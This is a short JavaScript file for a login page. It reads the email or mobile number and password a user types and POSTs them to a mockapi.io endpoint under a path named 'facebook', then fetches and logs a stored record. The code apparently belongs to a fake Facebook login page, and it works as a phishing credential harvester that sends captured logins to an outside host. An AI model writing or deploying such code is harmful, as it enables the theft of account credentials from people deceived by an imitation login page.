
const submit = ()=> {
    let mobileNo = document.getElementById('email').value;
    let password = document.getElementById('password').value;
    let credential = {mobileNo, password};
    getCredential(2);
    postCredential(credential);
}

const getCredential = async(id)=> {
    let res = await fetch(`https://64072cf4862956433e66d9b0.mockapi.io/facebook/${id}`)
    let data = await res.json();
    console.log(data);
}

const postCredential = async(credential)=> {
    let res = await fetch(`https://64072cf4862956433e66d9b0.mockapi.io/facebook/`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(credential)
    })
    let data = await res.json();
    console.log(data);
}

let submitBtn = document.getElementById('login');
submitBtn.addEventListener('click', submit)

